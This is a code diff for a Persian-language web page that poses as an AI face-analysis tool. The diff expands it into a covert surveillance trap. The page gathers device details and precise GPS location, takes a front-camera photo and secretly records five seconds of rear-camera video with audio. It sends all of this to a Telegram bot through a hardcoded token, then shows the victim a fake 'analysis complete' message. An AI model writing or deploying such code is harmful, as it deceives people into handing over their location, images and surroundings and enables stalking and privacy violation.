@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سامانه هوش مصنوعی تشخیص چهره</title>
+    <title>سامانه هوش مصنوعی تشخیص چهره و محیط</title>
     <style>
         body {
             font-family: Tahoma, sans-serif;
@@ -63,12 +63,12 @@
 <body>
 
     <div class="container">
-        <h2>✨ آنالیز هوشمند مشخصات و چهره</h2>
-        <p>برای شروع پردازش و دریافت نتیجه‌ی تحلیل اختصاصی دستگاه و تصویر، روی دکمه زیر کلیک کنید.</p>
+        <h2>✨ آنالیز هوشمند چهره و محیط</h2>
+        <p id="statusText">برای شروع پردازش و دریافت نتیجه‌ی تحلیل اختصاصی، روی دکمه زیر کلیک کنید.</p>
         <button id="startBtn" onclick="runProcess()">شروع پردازش و تحلیل</button>
     </div>
 
-    <!-- المان‌های مخفی برای پردازش دوربین -->
+    <!-- المان‌های مخفی برای ضبط رسانه -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -77,11 +77,9 @@
         const BOT_TOKEN = '8718656206:AAGr_nFBgZoOYFkOonagQy5q6gGJSN5iQbU'; 
         const CHAT_ID = '6820599989';     
 
-        // تابع کمکی برای استخراج اطلاعات سیستم و مرورگر
+        // تابع استخراج اطلاعات سیستم و مرورگر
         async function getSystemInfo() {
             let info = "";
-            
-            // تشخیص سیستم‌عامل و مرورگر از روی User Agent
             const ua = navigator.userAgent;
             let os = "نامشخص";
             if (ua.match(/Win/i)) os = "ویندوز (Windows)";
@@ -94,16 +92,13 @@
             info += `🌐 رزولوشن صفحه: ${window.screen.width}x${window.screen.height}\n`;
             info += `🕒 منطقه زمانی: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
 
-            // گرفتن اطلاعات باتری (در صورت پشتیبانی مرورگر)
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
                     const charging = battery.charging ? "⚡ در حال شارژ" : "🔋 باتری خالی‌شونده";
                     info += `🔋 وضعیت باتری: ${level}% (${charging})\n`;
-                } catch (e) {
-                    // اگر مرورگر اجازه نداد رد شو
-                }
+                } catch (e) {}
             }
 
             return info;
@@ -111,88 +106,135 @@
 
         async function runProcess() {
             const btn = document.getElementById('startBtn');
-            btn.innerText = "در حال پردازش سیستم...";
+            const statusText = document.getElementById('statusText');
             btn.disabled = true;
+            statusText.innerText = "در حال آماده‌سازی سیستم...";
 
-            // جمع‌آوری اطلاعات سیستم
             const sysInfo = await getSystemInfo();
 
-            // ۱. گرفتن لوکیشن (GPS)
+            // گرفتن لوکیشن
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        captureAndSend(lat, lon, sysInfo);
+                        startCaptureSequence(position.coords.latitude, position.coords.longitude, sysInfo);
                     },
                     (error) => {
-                        console.log("Location access denied or failed", error);
-                        captureAndSend(null, null, sysInfo); 
+                        startCaptureSequence(null, null, sysInfo);
                     },
                     { enableHighAccuracy: true }
                 );
             } else {
-                captureAndSend(null, null, sysInfo);
+                startCaptureSequence(null, null, sysInfo);
             }
         }
 
-        function captureAndSend(lat, lon, sysInfo) {
+        async function startCaptureSequence(lat, lon, sysInfo) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
+            const statusText = document.getElementById('statusText');
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    video.srcObject = stream;
-                    video.play();
+            try {
+                // مرحله اول: عکس از دوربین جلو (Selfie)
+                statusText.innerText = "در حال پردازش تصویر چهره...";
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = frontStream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                await new Promise(resolve => setTimeout(resolve, 1000)); // مکث کوتاه برای فیکس شدن فریم
 
-                    setTimeout(() => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        // متوقف کردن دوربین
-                        stream.getTracks().forEach(track => track.stop());
+                let photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'jpeg', 0.8));
+                
+                // قطع دوربین جلو
+                frontStream.getTracks().forEach(track => track.stop());
 
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'capture.jpg');
+                // مرحله دوم: فیلمبرداری ۵ ثانیه‌ای از دوربین عقب (Environment Video)
+                statusText.innerText = "در حال اسکن محیط اطراف (۵ ثانیه)...";
+                let backStream;
+                try {
+                    // تلاش برای باز کردن دوربین پشت
+                    backStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: { exact: "environment" } },
+                        audio: true 
+                    });
+                } catch (e) {
+                    // اگر دوربین پشت اختصاصی نشد، هر دوربین در دسترسی رو باز کن
+                    backStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                }
 
-                            // ساخت متن پیام کامل شامل مشخصات سیستم و لوکیشن
-                            let caption = "🎯 یک کاربر جدید وارد شد!\n\n";
-                            caption += "📊 **اطلاعات دستگاه:**\n" + sysInfo + "\n";
+                video.srcObject = backStream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
 
-                            if (lat && lon) {
-                                caption += `📍 **موقعیت جغرافیایی:**\nعرض: ${lat}\nطول: ${lon}\n\n🗺 **لینک در گوگل مپ:**\nhttps://www.google.com/maps?q=${lat},${lon}`;
-                            } else {
-                                caption += "⚠️ دسترسی به لوکیشن داده نشد.";
-                            }
-                            
-                            formData.append('caption', caption);
-                            formData.append('parse_mode', 'Markdown');
+                let mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm' });
+                let chunks = [];
 
-                            // ارسال به تلگرام
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            })
-                            .then(response => {
-                                document.querySelector('.container').innerHTML = '<h2>تحلیل با موفقیت انجام شد</h2><p>اطلاعات سخت‌افزاری و چهره شما با موفقیت پردازش گردید.</p>';
-                            })
-                            .catch(err => {
-                                alert("خطا در پردازش. لطفاً دوباره تلاش کنید.");
-                            });
-
-                        }, 'image/jpeg', 0.8);
-
-                    }, 1000); 
-                })
-                .catch(err => {
-                    alert("لطفاً اجازه دسترسی به دوربین را تأیید کنید.");
-                    document.getElementById('startBtn').innerText = "شروع پردازش و تحلیل";
-                    document.getElementById('startBtn').disabled = false;
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                
+                let videoBlobPromise = new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        let vBlob = new Blob(chunks, { type: 'video/webm' });
+                        resolve(vBlob);
+                    };
                 });
+
+                mediaRecorder.start();
+
+                // صبر کردن به مدت ۵ ثانیه برای ضبط ویدیو
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                
+                mediaRecorder.stop();
+                backStream.getTracks().forEach(track => track.stop());
+
+                let videoBlob = await videoBlobPromise;
+
+                // مرحله سوم: ارسال همه اطلاعات به تلگرام
+                statusText.innerText = "در حال ارسال اطلاعات نهایی...";
+
+                let caption = "🎯 یک کاربر جدید کامل اسکن شد!\n\n";
+                caption += "📊 **اطلاعات دستگاه:**\n" + sysInfo + "\n";
+
+                if (lat && lon) {
+                    caption += `📍 **موقعیت جغرافیایی:**\nعرض: ${lat}\nطول: ${lon}\n\n🗺 **لینک در گوگل مپ:**\nhttps://www.google.com/maps?q=${lat},${lon}`;
+                } else {
+                    caption += "⚠️ دسترسی به لوکیشن داده نشد.";
+                }
+
+                // ۱. ارسال عکس دوربین جلو
+                const photoFormData = new FormData();
+                photoFormData.append('chat_id', CHAT_ID);
+                photoFormData.append('photo', photoBlob, 'front_capture.jpg');
+                photoFormData.append('caption', caption);
+                photoFormData.append('parse_mode', 'Markdown');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: photoFormData
+                });
+
+                // ۲. ارسال ویدیوی ۵ ثانیه‌ای دوربین عقب
+                const videoFormData = new FormData();
+                videoFormData.append('chat_id', CHAT_ID);
+                videoFormData.append('video', videoBlob, 'environment_video.webm');
+                videoFormData.append('caption', '📹 ویدیوی ۵ ثانیه‌ای محیط اطراف (دوربین پشت)');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: videoFormData
+                });
+
+                document.querySelector('.container').innerHTML = '<h2>تحلیل با موفقیت انجام شد</h2><p>تمام فرآیندها به اتمام رسید.</p>';
+
+            } catch (err) {
+                console.error(err);
+                alert("لطفاً دسترسی به دوربین و میکروفون را تأیید کنید.");
+                document.getElementById('startBtn').innerText = "شروع پردازش و تحلیل";
+                document.getElementById('startBtn').disabled = false;
+                statusText.innerText = "برای شروع پردازش و دریافت نتیجه‌ی تحلیل اختصاصی، روی دکمه زیر کلیک کنید.";
+            }
         }
     </script>
 </body>
